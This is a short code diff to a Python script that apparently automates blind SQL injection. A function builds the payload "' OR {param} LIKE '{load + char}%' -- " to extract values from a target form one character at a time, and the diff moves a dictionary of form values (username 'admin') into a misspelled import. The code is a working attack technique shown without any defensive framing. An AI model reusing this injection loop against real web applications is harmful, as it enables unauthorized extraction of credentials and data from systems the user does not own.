@@ -1,6 +1,7 @@
 import requests
 import time
 import logger
+from gloabls import payloads
 
 class TestPayloadException(Exception):
     pass
@@ -9,17 +10,7 @@ def test_payload(form, param, load, char):
     # Construct the payload for SQL injection
     payload = f"' OR {param} LIKE '{load + char}%' -- "  # Modify payload structure as needed
     headers = {'Content-Type': 'application/json'}
-    
-    payloads = {
-        "basic": "a123",
-        "name": "John Doe",
-        "userName": "Asaf",
-        "username": "admin",  # Assuming 'admin' is the username
-        "user": "admin",  # Assuming 'admin' is the username
-        "email": "johndoe@example.com",
-        "password": "securepassword123"
-    }
-    
+      
     url = form['url']
     
     new_object = {}
